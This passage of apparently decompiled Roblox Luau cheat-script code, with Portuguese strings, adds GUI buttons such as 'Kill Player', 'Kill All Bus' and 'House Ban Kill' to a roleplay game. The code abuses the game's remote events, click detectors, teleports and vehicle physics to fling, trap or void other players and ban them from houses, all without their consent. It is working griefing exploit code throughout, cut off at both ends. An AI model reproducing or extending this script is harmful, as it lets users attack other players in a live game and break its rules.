				return game:GetService(p42)
			end
		}).Players
		local LocalPlayer2 = Players3.LocalPlayer
		local Vehicles = workspace:WaitForChild("Vehicles")
		local cFrame = CFrame.new(-1173, 76, -1192)
		local v421 = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r")
		local v422 = Players3:FindFirstChild(p40)

		if v422 then
			if v422.Character then
				local function v423()
					local v424 = workspace.Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car")

					v421:FireServer("DeleteAllVehicles")

					if not v424 or v424:GetAttribute("vehicleName") ~= "Semi" then
						local Character2 = LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()

						Character2:GetPivot()
						Character2:PivotTo(cFrame)
						task.wait(0.6)
						v421:FireServer("PickingCar", "Semi")
					end

					local v426

					while true do
						task.wait()
						v426 = Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car")

						if not v426 then
							continue
						end

						if v426.Parent then
							break
						end
					end

					ch:PivotTo(old)

					if v426:GetAttribute("vehicleName") ~= "Semi" then
						return v423()
					end

					local Body = v426:WaitForChild("Body")
					local Trailer = Body:WaitForChild("Trailer")

					if not (Trailer.PrimaryPart or Trailer:FindFirstChildWhichIsA("BasePart")) then
						return
					end

					local TrailerRelease = Body:WaitForChild("TrailerRelease")

					LocalPlayer2.Character:PivotTo(TrailerRelease.CFrame)

					local ClickDetector = TrailerRelease:FindFirstChildOfClass("ClickDetector")

					if ClickDetector then
						fireclickdetector(ClickDetector)
						task.wait(0.3)
					end

					local VehicleSeat = v426:WaitForChild("Seats"):WaitForChild("VehicleSeat")
					local Character2 = LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()

					repeat
						task.wait()
						Character2:PivotTo(VehicleSeat.CFrame)
					until Character2:WaitForChild("Humanoid").Sit

					return v426
				end

				local v433 = v423()

				if not v433 then
					return
				end

				local Trailer = v433.Body:FindFirstChild("Trailer")

				if not Trailer then
					return
				end

				local PrimaryPart = Trailer.PrimaryPart or Trailer:FindFirstChildWhichIsA("BasePart")

				if not PrimaryPart then
					return
				end

				local Character2 = v422.Character

				if not Character2 then
					return
				end

				Character2:FindFirstChild("Humanoid")

				local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")

				repeat
					task.wait()

					local Character3 = v422.Character

					if Character3 then
						local Humanoid2 = Character3:FindFirstChild("Humanoid")

						HumanoidRootPart2 = Character3:FindFirstChild("HumanoidRootPart")

						if Humanoid2 and HumanoidRootPart2 and not (Humanoid2.Health <= 0) then
							local v440 = HumanoidRootPart2.CFrame * CFrame.new(0, -1.6 + math.sin(tick() * 26) * 9, -2.2) + HumanoidRootPart2.Velocity / 2

							PrimaryPart.AssemblyLinearVelocity = HumanoidRootPart2.CFrame.LookVector * 920 + Vector3.new(0, 16500, 0)
							PrimaryPart.AssemblyAngularVelocity = Vector3.new(80, 120, 60)
							Trailer:PivotTo(v440)
						end
					end
				until HumanoidRootPart2.Velocity.Magnitude > 420 or not HumanoidRootPart2.Parent

				return
			end
		end

		warn("Não encontrou o jogador ou o personagem")
	end
	local function v441()
		if not u132 then
			print("Nenhum jogador selecionado!")

			return
		end

		local LocalPlayer2 = game.Players.LocalPlayer
		local Character2 = LocalPlayer2.Character
		local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
		local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")
		local v446 = game.Workspace:FindFirstChild("001_Lots")
		local n10 = 0

		Check = function()
			if LocalPlayer2 and Character2 and Humanoid2 then
				if HumanoidRootPart2 and workspace.Vehicles then
					return true
				end
			end

			return false
		end

		local v448 = game.Players:FindFirstChild(u132)

		if v448 and v448.Character and Check() then
			if not v446:FindFirstChild(LocalPlayer2.Name .. "House") then
				local t28 = {}

				for _, child in pairs(v446:GetChildren()) do
					if child.Name == "For Sale" then
						for _, descendant in pairs(child:GetDescendants()) do
							if descendant:IsA("NumberValue") and descendant.Name == "Number" and descendant.Value < 25 and descendant.Value > 10 then
								table.insert(t28, {
									Lot = child,
									Number = descendant.Value
								})

								break
							end
						end
					end
				end

				if not (#t28 > 0) then
					print("Nenhuma casa disponÃ\u{AD}vel para compra!")

					return
				end

				local v454 = t28[math.random(1, #t28)]
				local Number = v454.Number
				local BuyHouse = v454.Lot:FindFirstChild("BuyHouse")

				if BuyHouse and BuyHouse:IsA("BasePart") then
					HumanoidRootPart2.CFrame = BuyHouse.CFrame + Vector3.new(0, -6, 0)
					task.wait(0.5)

					local ClickDetector = BuyHouse:FindFirstChild("ClickDetector")

					if ClickDetector then
						fireclickdetector(ClickDetector)
					end
				end

				task.wait(0.5)
				game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):FireServer(unpack({
					Number,
					"056_House"
				}))
			end

			task.wait(0.5)

			local v458 = v446:FindFirstChild(LocalPlayer2.Name .. "House")

			if v458 then
				task.wait(0.5)

				local v459

				for _, descendant in pairs(v458:GetDescendants()) do
					if descendant.Name == "Number" and descendant:IsA("NumberValue") then
						v459 = descendant
					end
				end

				task.wait(0.5)
				game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", v459.Value)
			end

			task.wait(0.5)

			if not workspace.Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car") and Check() then
				HumanoidRootPart2.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
				task.wait(0.5)
				game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
				task.wait(0.5)

				local v462 = workspace.Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car")

				task.wait(0.5)

				local VehicleSeat = v462:FindFirstChild("Body") and v462.Body:FindFirstChild("VehicleSeat")

				if VehicleSeat then
					repeat
						task.wait()
						HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
					until Humanoid2.Sit
				end
			end

			task.wait(0.5)

			local v464 = workspace.Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car")

			if v464 then
				if not Humanoid2.Sit then
					local VehicleSeat = v464:FindFirstChild("Body") and v464.Body:FindFirstChild("VehicleSeat")

					if VehicleSeat then
						repeat
							task.wait()
							HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
						until Humanoid2.Sit
					end
				end

				local Character3 = v448.Character
				local Humanoid3 = Character3:FindFirstChildOfClass("Humanoid")
				local HumanoidRootPart3 = Character3:FindFirstChild("HumanoidRootPart")

				if Character3 and Humanoid3 and HumanoidRootPart3 and not Humanoid3.Sit then
					while not Humanoid3.Sit do
						task.wait()

						local function v469(p43, p44, p45)
							v464:SetPrimaryPartCFrame(CFrame.new(p43.Position) * p44 * p45)
						end

						n10 += 100
						v469(HumanoidRootPart3, CFrame.new(0, 1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n10), 0, 0))
						v469(HumanoidRootPart3, CFrame.new(0, -1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n10), 0, 0))
						v469(HumanoidRootPart3, CFrame.new(2.25, 1.5, -2.25) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n10), 0, 0))
						v469(HumanoidRootPart3, CFrame.new(-2.25, -1.5, 2.25) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n10), 0, 0))
						v469(HumanoidRootPart3, CFrame.new(0, 1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n10), 0, 0))
						v469(HumanoidRootPart3, CFrame.new(0, -1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n10), 0, 0))
					end

					task.wait(0.2)
					v464:SetPrimaryPartCFrame(CFrame.new(v446:FindFirstChild(LocalPlayer2.Name .. "House").HouseSpawnPosition.Position))
					task.wait(0.2)

					local v470 = workspace:FindPartsInRegion3(Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30, 30, 30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30, 30, 30)), game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)

					for _, v1 in pairs(v470) do
						if v1.Name == "HumanoidRootPart" then
							local t29 = {
								"BanPlayerFromHouse",
								game:GetService("Players"):FindFirstChild(v1.Parent.Name),
								v1.Parent
							}

							game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(t29))
							game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack({ "DeleteAllVehicles" }))
						end
					end
				end
			end
		end
	end

	v126:AddSection({
		Name = "Couch sem ir até o alvo"
	})
	v126:AddButton({
		Name = "Kill Player",
		Callback = v199
	})
	v126:AddButton({
		Name = "Puxar Player",
		Callback = v172
	})
	v126:AddSection({
		Name = "Bus"
	})
	v126:AddButton({
		Name = "Kill Player",
		Callback = function()
			local Character2 = LocalPlayer.Character
			local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")

			if not HumanoidRootPart2 then
				warn("Erro: HumanoidRootPart do jogador local não encontrado")

				return
			end

			local CFrame_ = HumanoidRootPart2.CFrame

			local function v477()
				local Vehicles = game.Workspace:FindFirstChild("Vehicles")

				if Vehicles then
					return Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
				end

				return nil
			end

			local v479 = v477()

			if not v479 then
				HumanoidRootPart2.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
				task.wait(0.5)

				local RE = ReplicatedStorage:FindFirstChild("RE")

				if RE and RE:FindFirstChild("1Ca1r") then
					RE["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
				end

				task.wait(1)
				v479 = v477()
			end

			if v479 then
				local VehicleSeat = v479:FindFirstChild("Body") and v479.Body:FindFirstChild("VehicleSeat")

				if VehicleSeat and Character2:FindFirstChildOfClass("Humanoid") and not Character2.Humanoid.Sit then
					while true do
						HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, 2, 0)
						task.wait()

						if Character2.Humanoid.Sit then
							break
						elseif not v479.Parent then
							break
						end
					end

					if Character2.Humanoid.Sit or not v479.Parent then
						for _, child in pairs(v479.Body:GetChildren()) do
							if child:IsA("Seat") then
								child.CanTouch = true
							end
						end
					end
				end
			end

			spawn(function()
				while true do
					if not u132 then
						RunService.RenderStepped:Wait()

						continue
					end

					local v484 = Players2:FindFirstChild(u132)

					if not v484 then
						RunService.RenderStepped:Wait()

						continue
					end

					if not v484.Character then
						RunService.RenderStepped:Wait()

						continue
					end

					if not v484.Character:FindFirstChild("HumanoidRootPart") then
						RunService.RenderStepped:Wait()

						continue
					end

					local Humanoid2 = v484.Character:FindFirstChildOfClass("Humanoid")

					if Humanoid2 and Humanoid2.Sit then
						break
					end

					local HumanoidRootPart3 = v484.Character.HumanoidRootPart
					local v487 = tick() * 35

					v479:SetPrimaryPartCFrame(HumanoidRootPart3.CFrame * CFrame.new(math.sin(v487) * 4, 0, math.cos(v487) * 20))
					RunService.RenderStepped:Wait()
				end

				if Character2.Humanoid then
					v479:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, -450, 9999)))
					print("Jogador sentou, levando ônibus para o void!")
					task.wait(0.2)

					local function v488()
						local Humanoid2 = Character2 and Character2:FindFirstChildWhichIsA("Humanoid")

						if Humanoid2 then
							Humanoid2:ChangeState(Enum.HumanoidStateType.Jumping)
						end
					end

					v488()
					print("Simulando pulo!")
					task.wait(0.5)
					HumanoidRootPart2.CFrame = CFrame_
					print("Player voltou para a posição inicial.")
				end
			end)
		end
	})
	v126:AddButton({
		Name = "Puxar Player",
		Callback = function()
			local Character2 = LocalPlayer.Character
			local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")

			if not HumanoidRootPart2 then
				warn("Erro: HumanoidRootPart do jogador local não encontrado")

				return
			end

			local CFrame_ = HumanoidRootPart2.CFrame

			local function v493()
				local Vehicles = game.Workspace:FindFirstChild("Vehicles")

				if Vehicles then
					return Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
				end

				return nil
			end

			local v495 = v493()

			if not v495 then
				HumanoidRootPart2.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
				task.wait(0.5)

				local RE = ReplicatedStorage:FindFirstChild("RE")

				if RE and RE:FindFirstChild("1Ca1r") then
					RE["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
				end

				task.wait(1)
				v495 = v493()
			end

			if v495 then
				local VehicleSeat = v495:FindFirstChild("Body") and v495.Body:FindFirstChild("VehicleSeat")

				if VehicleSeat and Character2:FindFirstChildOfClass("Humanoid") and not Character2.Humanoid.Sit then
					while true do
						HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, 2, 0)
						task.wait()

						if Character2.Humanoid.Sit then
							break
						elseif not v495.Parent then
							break
						end
					end
				end
			end

			spawn(function()
				while true do
					if not u132 then
						RunService.RenderStepped:Wait()

						continue
					end

					local v498 = Players2:FindFirstChild(u132)

					if not v498 then
						RunService.RenderStepped:Wait()

						continue
					end

					if not v498.Character then
						RunService.RenderStepped:Wait()

						continue
					end

					if not v498.Character:FindFirstChild("HumanoidRootPart") then
						RunService.RenderStepped:Wait()

						continue
					end

					local Humanoid2 = v498.Character:FindFirstChildOfClass("Humanoid")

					if Humanoid2 and Humanoid2.Sit then
						break
					end

					local HumanoidRootPart3 = v498.Character.HumanoidRootPart
					local v501 = tick() * 35

					v495:SetPrimaryPartCFrame(HumanoidRootPart3.CFrame * CFrame.new(math.sin(v501) * 4, 0, math.cos(v501) * 20))
					RunService.RenderStepped:Wait()
				end

				if Character2.Humanoid then
					v495:SetPrimaryPartCFrame(CFrame_)
					task.wait(0.7)
					ReplicatedStorage.RE:FindFirstChild("1Ca1r"):FireServer(unpack({ "DeleteAllVehicles" }))
				end
			end)
		end
	})
	v126:AddButton({
		Name = "Kill All Bus",
		Callback = function()
			local Players3 = game:GetService("Players")
			local Workspace = game:GetService("Workspace")
			local RunService2 = game:GetService("RunService")
			local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
			local vector3 = Vector3.new(145.51, -374.09, 21.58)
			local CFrame_

			local function v508()
				local Vehicles = Workspace:FindFirstChild("Vehicles")

				if Vehicles then
					return Vehicles:FindFirstChild(Players3.LocalPlayer.Name .. "Car")
				end

				return nil
			end
			local function v510(p46, p47)
				while true do
					if not p46 then
						RunService2.RenderStepped:Wait()

						continue
					end

					local v511 = Players3:FindFirstChild(p46)

					if not v511 or not v511.Character then
						RunService2.RenderStepped:Wait()

						continue
					end

					if not v511.Character:FindFirstChild("HumanoidRootPart") then
						RunService2.RenderStepped:Wait()

						continue
					end

					local Humanoid2 = v511.Character:FindFirstChildOfClass("Humanoid")

					if Humanoid2 and Humanoid2.Sit then
						break
					end

					local HumanoidRootPart2 = v511.Character.HumanoidRootPart
					local v514 = tick() * 35
					local v515 = math.sin(v514) * 10
					local v516 = math.cos(v514) * 20
					local v517 = v508()

					if v517 then
						v517:SetPrimaryPartCFrame(HumanoidRootPart2.CFrame * CFrame.new(0, 0, v516))
					end

					RunService2.RenderStepped:Wait()
				end

				local v518 = v508()

				if v518 then
					v518:SetPrimaryPartCFrame(CFrame.new(vector3))
					print("Jogador sentou, levando ônibus para o void!")
					task.wait(0.2)

					local function v519()
						local Humanoid2 = Players3.LocalPlayer.Character and Players3.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")

						if Humanoid2 then
							Humanoid2:ChangeState(Enum.HumanoidStateType.Jumping)
						end
					end

					v519()
					print("Simulando primeiro pulo!")
					task.wait(0.4)
					v519()
					print("Simulando segundo pulo!")
					task.wait(0.5)

					if CFrame_ then
						Players3.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame_
						print("Player voltou para a posição inicial Xique")
						task.wait(0.1)
						ReplicatedStorage2:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack({ "DeleteAllVehicles" }))
						print("Todos os veículos foram deletados!")
					end
				end

				if p47 then
					p47()
				end
			end
			local function v521(p48, p49)
				local LocalPlayer2 = Players3.LocalPlayer
				local Character2 = LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()
				local HumanoidRootPart2 = Character2:WaitForChild("HumanoidRootPart")

				CFrame_ = HumanoidRootPart2.CFrame

				local v525 = v508()

				if not v525 then
					HumanoidRootPart2.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
					task.wait(0.5)

					local RE = ReplicatedStorage2:FindFirstChild("RE")

					if RE and RE:FindFirstChild("1Ca1r") then
						RE["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
					end

					task.wait(1)
					v525 = v508()
				end

				if v525 then
					local VehicleSeat = v525:FindFirstChild("Body") and v525.Body:FindFirstChild("VehicleSeat")

					if VehicleSeat and Character2:FindFirstChildOfClass("Humanoid") and not Character2.Humanoid.Sit then
						while true do
							HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, 2, 0)
							task.wait()

							if Character2.Humanoid.Sit then
								break
							elseif not v525.Parent then
								break
							end
						end
					end
				end

				spawn(function()
					v510(p48, p49)
				end)
			end
			local function v528(p50)
				if #p50 == 0 then
					return
				end

				v521(table.remove(p50, 1).Name, function()
					task.wait(0.5)
					v528(p50)
				end)
			end

			v528(Players3:GetPlayers())
		end
	})
	v126:AddButton({
		Name = "House Ban Kill",
		Callback = v441
	})
	v126:AddButton({
		Name = "House Ban kill All",
		Callback = function()
			local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
			local Players3 = game:GetService("Players")
			local Workspace = game:GetService("Workspace")

			local function v532(p51)
				local LocalPlayer2 = game.Players.LocalPlayer
				local Character2 = LocalPlayer2.Character
				local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
				local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")
				local v537 = game.Workspace:FindFirstChild("001_Lots")
				local n11 = 0
				local Vehicles = Workspace.Vehicles

				Check = function()
					if LocalPlayer2 and Character2 and Humanoid2 and HumanoidRootPart2 then
						if Vehicles then
							return true
						end
					end

					return false
				end

				if Check() then
					if not v537:FindFirstChild(LocalPlayer2.Name .. "House") then
						local v540

						for _, child in pairs(v537:GetChildren()) do
							if child.Name == "For Sale" then
								for _, descendant in pairs(child:GetDescendants()) do
									if descendant:IsA("NumberValue") and descendant.Name == "Number" and descendant.Value < 25 and descendant.Value > 10 then
										v540 = child

										break
									end
								end
							end
						end

						local BuyHouse = v540:FindFirstChild("BuyHouse")

						if BuyHouse and BuyHouse:IsA("BasePart") then
							HumanoidRootPart2.CFrame = BuyHouse.CFrame + Vector3.new(0, -6, 0)
							task.wait(0.5)

							local ClickDetector = BuyHouse:FindFirstChild("ClickDetector")

							if ClickDetector then
								fireclickdetector(ClickDetector)
							end
						end
					end

					task.wait(0.5)

					local v547 = v537:FindFirstChild(LocalPlayer2.Name .. "House")

					if v547 then
						task.wait(0.5)

						local v548

						for _, descendant in pairs(v547:GetDescendants()) do
							if descendant.Name == "Number" and descendant:IsA("NumberValue") then
								v548 = descendant
							end
						end

						task.wait(0.5)
						game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", v548.Value)
					end

					task.wait(0.5)

					if not Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car") and Check() then
						HumanoidRootPart2.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
						task.wait(0.5)
						game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
						task.wait(0.5)

						local v551 = Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car")

						task.wait(0.5)

						local VehicleSeat = v551:FindFirstChild("Body") and v551.Body:FindFirstChild("VehicleSeat")

						if VehicleSeat then
							repeat
								task.wait()
								HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
							until Humanoid2.Sit
						end
					end

					task.wait(0.5)

					local v553 = Vehicles:FindFirstChild(LocalPlayer2.Name .. "Car")

					if v553 then
						if not Humanoid2.Sit then
							local VehicleSeat = v553:FindFirstChild("Body") and v553.Body:FindFirstChild("VehicleSeat")

							if VehicleSeat then
								repeat
									task.wait()
									HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
								until Humanoid2.Sit
							end
						end

						local Character3 = p51.Character
						local Humanoid3 = Character3:FindFirstChildOfClass("Humanoid")
						local HumanoidRootPart3 = Character3:FindFirstChild("HumanoidRootPart")

						if Character3 and Humanoid3 and HumanoidRootPart3 and not Humanoid3.Sit then
							while not Humanoid3.Sit do
								task.wait()

								local function v558(p52, p53, p54)
									v553:SetPrimaryPartCFrame(CFrame.new(p52.Position) * p53 * p54)
								end

								n11 += 100
								v558(HumanoidRootPart3, CFrame.new(0, 1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n11), 0, 0))
								v558(HumanoidRootPart3, CFrame.new(0, -1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n11), 0, 0))
								v558(HumanoidRootPart3, CFrame.new(2.25, 1.5, -2.25) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n11), 0, 0))
								v558(HumanoidRootPart3, CFrame.new(-2.25, -1.5, 2.25) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n11), 0, 0))
								v558(HumanoidRootPart3, CFrame.new(0, 1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n11), 0, 0))
								v558(HumanoidRootPart3, CFrame.new(0, -1.5, 0) + Humanoid3.MoveDirection * HumanoidRootPart3.Velocity.Magnitude / 1.1, CFrame.Angles(math.rad(n11), 0, 0))
							end

							task.wait(0.2)
							v553:SetPrimaryPartCFrame(CFrame.new(v537:FindFirstChild(LocalPlayer2.Name .. "House").HouseSpawnPosition.Position))
							task.wait(0.2)

							local v559 = workspace:FindPartsInRegion3(Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30, 30, 30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30, 30, 30)), game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)

							for _, v1 in pairs(v559) do
								if v1.Name == "HumanoidRootPart" then
									local t30 = {
										"BanPlayerFromHouse",
										game:GetService("Players"):FindFirstChild(v1.Parent.Name),
										v1.Parent
									}

									game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(t30))
								end
							end
						end
					end
				end

				ReplicatedStorage2:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack({ "DeleteAllVehicles" }))
			end

			for _, player in pairs(Players3:GetPlayers()) do
				if player ~= Player then
					v532(player)
					task.wait(2)
				end
			end
		end
	})

	local LocalPlayer2 = game:GetService("Players").LocalPlayer

	local function v566(p55)
		local Players3 = setmetatable({}, {
			__index = function(p56, p57)
				return game:GetService(p57)
			end
		}).Players
		local LocalPlayer3 = Players3.LocalPlayer
		local Vehicles = workspace:WaitForChild("Vehicles")
		local cFrame = CFrame.new(-1173, 76, -1192)
		local v571 = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r")
		local v572 = Players3:FindFirstChild(p55)

		if v572 then
			if v572.Character then
				local function v573()
					local v574 = workspace.Vehicles:FindFirstChild(LocalPlayer3.Name .. "Car")

					if not v574 or v574:GetAttribute("vehicleName") ~= "TowTruck" then
						v571:FireServer("DeleteAllVehicles")

						local Character2 = LocalPlayer3.Character or LocalPlayer3.CharacterAdded:Wait()
						local pivot = Character2:GetPivot()

						Character2:PivotTo(cFrame)
						task.wait(0.6)
						v571:FireServer("PickingCar", "TowTruck")

						while true do
							task.wait()
							v574 = Vehicles:FindFirstChild(LocalPlayer3.Name .. "Car")

							if not v574 then
								continue
							end

							if v574.Parent then
								break
							end
						end

						Character2:PivotTo(pivot)

						if v574:GetAttribute("vehicleName") ~= "TowTruck" then
							return v573()
						end
					end

					local VehicleSeat = v574:WaitForChild("Seats"):WaitForChild("VehicleSeat")
					local Character2 = LocalPlayer3.Character

					Character2 = Character2 or LocalPlayer3.CharacterAdded:Wait()

					repeat
						task.wait()
						Character2:PivotTo(VehicleSeat.CFrame)
					until Character2:WaitForChild("Humanoid").Sit

					return v574
				end

				local v579 = v573()

				if not v579 then
					return
				end

				local ModelMove = v579.Body:FindFirstChild("ModelMove")

				if not ModelMove then
					return
				end

				local PrimaryPart = ModelMove.PrimaryPart or ModelMove:FindFirstChildWhichIsA("BasePart")

				if not PrimaryPart then
					return
				end

				local Character2 = v572.Character

				if not Character2 then
					return
				end

				Character2:FindFirstChild("Humanoid")

				local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")

				repeat
					task.wait()

					local Character3 = v572.Character

					if Character3 then
						local Humanoid2 = Character3:FindFirstChild("Humanoid")

						HumanoidRootPart2 = Character3:FindFirstChild("HumanoidRootPart")

						if Humanoid2 and HumanoidRootPart2 and not (Humanoid2.Health <= 0) then
							local v586 = HumanoidRootPart2.CFrame * CFrame.new(0, -1.6 + math.sin(tick() * 26) * 9, -2.2) + HumanoidRootPart2.Velocity / 2

							PrimaryPart.AssemblyLinearVelocity = HumanoidRootPart2.CFrame.LookVector * 920 + Vector3.new(0, 16500, 0)
							PrimaryPart.AssemblyAngularVelocity = Vector3.new(80, 120, 60)
							ModelMove:PivotTo(v586)
						end
					end
				until HumanoidRootPart2.Velocity.Magnitude > 420 or not HumanoidRootPart2.Parent

				return
			end
		end

		warn("Não encontrou o jogador ou o personagem")
	end

	local Players3 = game:GetService("Players")
	local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
	local RunService2 = game:GetService("RunService")
	local Workspace = game:GetService("Workspace")
	local LocalPlayer3 = Players3.LocalPlayer
	local v592 = ReplicatedStorage2:WaitForChild("RE"):WaitForChild("1Ca1r")

	local function v593(p58)
		if p58 and p58.Character then
			if LocalPlayer3.Character then
				local Character2 = LocalPlayer3.Character or LocalPlayer3.CharacterAdded:Wait()
				local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
				local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")

				if Humanoid2 and HumanoidRootPart2 then
					local Position = HumanoidRootPart2.Position

					pcall(function()
						HumanoidRootPart2.Anchored = true
						HumanoidRootPart2.CFrame = CFrame.new(Vector3.new(1181.83, 76.08, -1158.83))
						task.wait(0.2)
						HumanoidRootPart2.Velocity = Vector3.zero
						HumanoidRootPart2.RotVelocity = Vector3.zero
						HumanoidRootPart2.Anchored = false
						Humanoid2:ChangeState(Enum.HumanoidStateType.GettingUp)
					end)
					task.wait(0.5)
					pcall(function()
						v592:FireServer("DeleteAllVehicles")
					end)
					task.wait(0.1)
					pcall(function()
						v592:FireServer("PickingCar", "SchoolBus")
					end)
					task.wait(1)

					local Vehicles = Workspace:FindFirstChild("Vehicles")

					if Vehicles then
						local v599 = Vehicles:FindFirstChild(LocalPlayer3.Name .. "Car")

						if v599 then
							pcall(function()
								HumanoidRootPart2.Anchored = true
								HumanoidRootPart2.CFrame = CFrame.new(Vector3.new(1171.15, 79.45, -1166.2))
								task.wait(0.2)
								HumanoidRootPart2.Velocity = Vector3.zero
								HumanoidRootPart2.RotVelocity = Vector3.zero
								HumanoidRootPart2.Anchored = false
								Humanoid2:ChangeState(Enum.HumanoidStateType.Seated)
							end)

							local now = tick()

							repeat
								if not (tick() - now < 10) then
									return
								end

								task.wait()
							until Humanoid2.Sit

							for _, descendant in ipairs(v599:GetDescendants()) do
								if descendant:IsA("BasePart") then
									descendant.CanCollide = false
									pcall(function()
										descendant:SetNetworkOwner(nil)
									end)
								end
							end

							local connection = RunService2.Stepped:Connect(function()
								for _, descendant in ipairs(Character2:GetDescendants()) do
									if descendant:IsA("BasePart") then
										descendant.CanCollide = false
									end
								end
							end)
							local now2 = tick()
							local BodyVelocity
							local u608 = true

							RunService2.Heartbeat:Connect(function()
								if not u608 or not p58 or not p58.Character then
									u608 = false

									return
								end

								local HumanoidRootPart3 = p58.Character:FindFirstChild("HumanoidRootPart")
								local Humanoid3 = p58.Character:FindFirstChild("Humanoid")

								if not HumanoidRootPart3 or not Humanoid3 or not HumanoidRootPart2 or not Humanoid2 then
									u608 = false

									return
								end

								local vector3 = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))

								pcall(function()
									v599:PivotTo(CFrame.new(HumanoidRootPart3.Position + vector3) * CFrame.Angles(math.rad(Workspace.DistributedGameTime * 12000), math.rad(Workspace.DistributedGameTime * 15000), math.rad(Workspace.DistributedGameTime * 18000)))
								end)

								local v612 = false

								for _, descendant in ipairs(v599:GetDescendants()) do
									if (descendant:IsA("Seat") or descendant:IsA("VehicleSeat")) and descendant.Occupant == Humanoid3 then
										v612 = true

										break
									end
								end

								if v612 or tick() - now2 > 10 then
									u608 = false
									pcall(function()
										v599:PivotTo(CFrame.new(Vector3.new(-59599, 2040070, -293391)))
									end)
									BodyVelocity = Instance.new("BodyVelocity")
									BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
